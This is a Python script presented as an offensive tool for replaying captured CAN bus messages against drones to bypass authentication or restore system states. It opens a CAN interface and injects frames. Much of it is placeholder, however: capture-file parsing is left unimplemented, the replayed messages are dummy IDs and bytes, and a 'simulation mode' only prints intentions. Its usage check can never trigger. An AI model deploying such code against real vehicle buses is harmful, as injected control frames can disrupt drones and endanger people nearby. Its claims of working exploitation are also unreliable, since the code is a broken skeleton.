#!/usr/bin/env python3
"""
CAN Bus Replay
Replay captured CAN bus messages to exploit vulnerabilities

Captures and replays CAN bus messages to exploit replay vulnerabilities,
bypass authentication, or restore previous system states.

CVSS Score: 6.0 (Medium)
Affected: Drones with CAN bus interfaces
"""

import sys
import time

def check_can_tools():
    """Check if CAN tools are available"""
    try:
        import can
        return True
    except ImportError:
        return False

def replay_can_messages(interface='can0', capture_file=None, message_id=None):
    """
    Replay CAN bus messages
    
    Args:
        interface: CAN interface (e.g., can0, vcan0)
        capture_file: File with captured messages (optional)
        message_id: Specific message ID to replay (optional)
    """
    try:
        print("[*] CAN Bus Replay Attack")
        print(f"[*] Interface: {interface}")
        if capture_file:
            print(f"[*] Capture file: {capture_file}")
        if message_id:
            print(f"[*] Target message ID: 0x{message_id:x}")
        print()
        
        has_can = check_can_tools()
        
        if not has_can:
            print("[!] python-can not available - using simulation mode")
            print("[*] Install with: pip install python-can")
            print()
        
        print("[*] CAN Replay Strategy:")
        print("    1. Capture CAN bus messages (or load from file)")
        print("    2. Filter target messages")
        print("    3. Replay messages to exploit replay vulnerabilities")
        print("    4. Bypass authentication or restore states")
        print()
        
        if has_can:
            import can
            
            try:
                # Create CAN bus interface
                print(f"[*] Opening CAN interface {interface}...")
                bus = can.interface.Bus(channel=interface, bustype='socketcan')
                print("[+] CAN bus connected")
                
                if capture_file:
                    # Load messages from file
                    print(f"[*] Loading messages from {capture_file}...")
                    # In real implementation, would parse capture file
                    print("[*] Replaying captured messages...")
                else:
                    # Replay common messages
                    print("[*] Replaying common CAN messages...")
                    messages_to_replay = [
                        (0x100, [0x01, 0x02, 0x03, 0x04]),
                        (0x101, [0x05, 0x06, 0x07, 0x08]),
                        (0x102, [0x09, 0x0A, 0x0B, 0x0C]),
                    ]
                    
                    for msg_id, data in messages_to_replay:
                        if message_id and msg_id != message_id:
                            continue
                        
                        msg = can.Message(
                            arbitration_id=msg_id,
                            data=data,
                            is_extended_id=False
                        )
                        bus.send(msg)
                        print(f"[+] Replayed message ID: 0x{msg_id:x}")
                        time.sleep(0.1)
                
                bus.shutdown()
                print("[+] CAN replay completed")
            except Exception as e:
                print(f"[-] CAN replay failed: {e}")
                simulate_can_replay()
        else:
            simulate_can_replay()
        
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def simulate_can_replay():
    """Simulate CAN replay"""
    print("[*] Simulation mode: CAN bus replay")
    print("[*] Would attempt:")
    print("    - Load captured CAN messages")
    print("    - Filter messages by ID")
    print("    - Replay authentication messages")
    print("    - Replay control messages")
    print("    - Exploit replay vulnerabilities")

def main():
    if len(sys.argv) < 1:
        print("Usage: python3 can_bus_replay.py [interface] [capture_file] [message_id]")
        print("\nArguments:")
        print("  interface     CAN interface (default: can0)")
        print("  capture_file  File with captured messages (optional)")
        print("  message_id    Specific message ID to replay in hex (optional)")
        print("\nExamples:")
        print("  python3 can_bus_replay.py")
        print("  python3 can_bus_replay.py can0")
        print("  python3 can_bus_replay.py can0 capture.log 0x123")
        print("\nCAN Bus Replay")
        print("CVSS Score: 6.0 (Medium)")
        print("Affected: Drones with CAN bus interfaces")
        print("\nNote: Requires python-can library")
        sys.exit(1)
    
    interface = sys.argv[1] if len(sys.argv) > 1 else 'can0'
    capture_file = sys.argv[2] if len(sys.argv) > 2 else None
    message_id = int(sys.argv[3], 16) if len(sys.argv) > 3 else None
    
    replay_can_messages(interface, capture_file, message_id)

if __name__ == "__main__":
    main()
